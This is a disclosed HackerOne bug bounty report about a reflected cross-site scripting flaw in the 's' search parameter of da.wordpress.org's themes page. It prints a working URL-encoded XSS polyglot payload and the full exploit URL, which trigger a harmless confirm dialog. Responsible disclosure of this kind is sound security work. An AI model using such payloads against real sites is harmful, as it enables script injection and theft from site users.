# Reflected XSS at https://da.wordpress.org/themes/?s= via "s=" parameter 

## Report Details
- **Report ID**: 222040
- **URL**: https://hackerone.com/reports/222040
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-04-18T23:43:15.856Z
- **Disclosed**: 2017-07-26T18:16:55.372Z

## Reporter
- **Username**: jon_bottarini
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
Hello - 

You have a reflected XSS vulnerability located at this domain:

https://da.wordpress.org/themes/?s=

This was tested on the latest version of Chrome (Version 57.0.2987.133 (64-bit)

By entering this payload in the URL, you are able to execute a script to fire:

`1%3C!%27/*%22/*\%27/*\%22/*--%3E%3C/Script%3E%3CImage%20Srcset=K%20*/;%20Onerror=confirm`1`%20//%3E#`

Note that the "1" in the confirm is enclosed in backticks, the HackerOne editor just makes it difficult to show. I have attached a screenshot to show the full URL, as well as included it below: 

https://da.wordpress.org/themes/?s=1%3C!%27/*%22/*\%27/*\%22/*--%3E%3C/Script%3E%3CImage%20Srcset=K%20*/;%20Onerror=confirm`1`%20//%3E#

Please let me know if you have any other questions, thanks!



## Attachments
- full_URL.png
- Screen_Shot_2017-04-18_at_4.40.23_PM.png
